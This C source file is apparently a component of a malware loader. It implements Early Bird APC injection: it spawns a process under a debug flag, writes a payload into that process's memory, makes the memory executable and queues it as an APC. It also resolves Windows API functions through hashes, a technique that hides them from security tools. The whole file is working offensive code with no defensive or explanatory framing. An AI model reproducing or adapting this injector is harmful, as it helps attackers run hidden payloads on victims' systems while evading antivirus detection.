#include "loader_config.h"

#ifdef INJECT_EARLY_BIRD

#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"


#ifndef DEBUG_ONLY_THIS_PROCESS
#define DEBUG_ONLY_THIS_PROCESS 0x00000002
#endif
#ifndef DETACHED_PROCESS
#define DETACHED_PROCESS        0x00000008
#endif

extern API_HASHING g_Api;

BOOL EarlyBirdInject(IN PBYTE pPayload, IN SIZE_T sSize) {

    HMODULE hKernel32 = GetModuleHandleH(KERNEL32DLL_JOAA);
    if (!hKernel32)
        return FALSE;

    fnVirtualAllocEx       pVirtualAllocEx       = (fnVirtualAllocEx)      GetProcAddressH(hKernel32, VirtualAllocEx_JOAA);
    fnVirtualProtectEx     pVirtualProtectEx     = (fnVirtualProtectEx)    GetProcAddressH(hKernel32, VirtualProtectEx_JOAA);
    fnWriteProcessMemory   pWriteProcessMemory   = (fnWriteProcessMemory)  GetProcAddressH(hKernel32, WriteProcessMemory_JOAA);
    fnQueueUserAPC         pQueueUserAPC         = (fnQueueUserAPC)        GetProcAddressH(hKernel32, QueueUserAPC_JOAA);
    fnCreateProcessW       pCreateProcessW       = (fnCreateProcessW)      GetProcAddressH(hKernel32, CreateProcessW_JOAA);
    fnDebugActiveProcessStop pDebugActiveProcessStop = (fnDebugActiveProcessStop)GetProcAddressH(hKernel32, DebugActiveProcessStop_JOAA);

    if (!pVirtualAllocEx || !pVirtualProtectEx || !pWriteProcessMemory ||
        !pQueueUserAPC   || !pCreateProcessW   || !pDebugActiveProcessStop)
        return FALSE;

    STARTUPINFOW        si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!pCreateProcessW(NULL, SPAWN_PROCESS, NULL, NULL, FALSE,
                         DEBUG_ONLY_THIS_PROCESS | DETACHED_PROCESS,
                         NULL, NULL, &si, &pi)) {
#ifdef DEBUG
        PRINTA("[!] CreateProcessW failed: 0x%08X\n", GetLastError());
#endif
        return FALSE;
    }

    PVOID pRemoteBase = pVirtualAllocEx(pi.hProcess, NULL, sSize,
                                        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteBase) {
#ifdef DEBUG
        PRINTA("[!] VirtualAllocEx failed: 0x%08X\n", GetLastError());
#endif
        g_Api.pCloseHandle(pi.hProcess);
        g_Api.pCloseHandle(pi.hThread);
        return FALSE;
    }

    if (!pWriteProcessMemory(pi.hProcess, pRemoteBase, pPayload, sSize, NULL)) {
#ifdef DEBUG
        PRINTA("[!] WriteProcessMemory failed: 0x%08X\n", GetLastError());
#endif
        g_Api.pCloseHandle(pi.hProcess);
        g_Api.pCloseHandle(pi.hThread);
        return FALSE;
    }

    DWORD dwOld = 0;
    pVirtualProtectEx(pi.hProcess, pRemoteBase, sSize, PAGE_EXECUTE_READWRITE, &dwOld);

    pQueueUserAPC((PAPCFUNC)pRemoteBase, pi.hThread, 0);

    pDebugActiveProcessStop(pi.dwProcessId);

#ifdef DEBUG
    PRINTA("[+] EarlyBird APC queued at 0x%p in PID %lu\n", pRemoteBase, pi.dwProcessId);
#endif

    g_Api.pCloseHandle(pi.hProcess);
    g_Api.pCloseHandle(pi.hThread);

    return TRUE;
}

#endif // INJECT_EARLY_BIRD
